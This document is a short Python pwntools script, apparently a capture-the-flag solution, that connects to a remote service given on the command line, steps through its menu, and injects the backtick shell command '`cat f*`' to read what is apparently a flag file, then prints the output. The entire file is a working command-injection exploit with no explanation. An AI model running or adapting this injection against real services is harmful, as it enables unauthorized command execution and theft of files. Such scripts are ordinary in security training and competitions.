#!/usr/bin/env python
import pwn
import sys
import struct

c = pwn.remote(sys.argv[1], int(sys.argv[2]))
c.sendlineafter(">", b"2")
c.sendlineafter(">", b"zz")
c.sendlineafter(">", b"hi")
c.sendlineafter(">", b"4")
c.sendlineafter(">", b"zz")
c.sendlineafter(">", b"5")
c.sendlineafter(">", b"`cat f*`")
c.sendlineafter(">", b"6")
print c.read()
print c.read()
print c.read()
